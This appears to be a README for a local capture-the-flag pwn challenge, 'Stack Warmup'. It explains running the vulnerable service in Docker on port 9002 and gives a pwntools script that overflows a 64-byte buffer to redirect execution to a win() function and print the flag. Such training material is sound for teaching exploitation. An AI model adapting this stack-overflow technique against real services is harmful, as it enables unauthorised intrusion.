# Stack Warmup (CTF Pwn Challenge)

This challenge can be run entirely on your local machine using Docker, so you don't depend on any external server or network IP.

---

## 🚀 Quick Start (Run Locally with Docker)

### Option 1: Using Docker Compose
```bash
docker compose up -d
```

### Option 2: Using Plain Docker
```bash
docker build -t stack-warmup .
docker run -d -p 9002:9002 --name stack-warmup stack-warmup
```

The challenge is now listening locally on port **9002**!

---

## 🔌 Connecting to the Service

Test your connection from your terminal:
```bash
nc localhost 9002
# Or on Windows PowerShell:
# Test-NetConnection -ComputerName localhost -Port 9002
# Or using python / ncat
```

---

## 🎯 Exploit Target

1. Disassemble `./vuln` to find the address of `win()`:
   ```bash
   objdump -d ./vuln | grep "<win>:"
   ```
2. Calculate the offset to the return address (64 bytes buffer + 8 bytes saved base pointer = 72 bytes).
3. Connect and send your payload using Python & pwntools:
   ```python
   from pwn import *

   # Connect to your local container instance
   p = remote('localhost', 9002)

   # win() address found via objdump
   win_addr = 0x4019a5

   # Payload: 72 bytes padding + win() address
   payload = b'A' * 72 + p64(win_addr)

   p.sendlineafter(b': ', payload)
   print(p.recvall().decode())
   ```
4. Decode the output to retrieve the flag!
